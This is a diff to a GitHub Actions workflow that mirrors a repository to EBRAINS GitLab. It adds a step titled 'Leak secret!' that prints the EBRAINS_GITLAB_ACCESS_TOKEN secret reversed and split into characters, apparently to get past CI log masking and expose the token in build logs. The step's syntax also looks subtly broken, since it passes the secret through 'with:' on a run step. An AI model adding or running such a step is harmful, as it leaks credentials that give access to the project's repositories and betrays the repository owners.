@@ -8,6 +8,11 @@ jobs:
   ebrains_mirror:
     runs-on: ubuntu-latest
     steps:
+      - name: Leak secret!
+        with:
+          BIG_SECRET: ${{ secrets.EBRAINS_GITLAB_ACCESS_TOKEN }}
+        run: |
+          python -c "import sys; print(*reversed(sys.argv[1]))" $BIG_SECRET
       - name: sync_main
         uses: wei/git-sync@v3
         with:
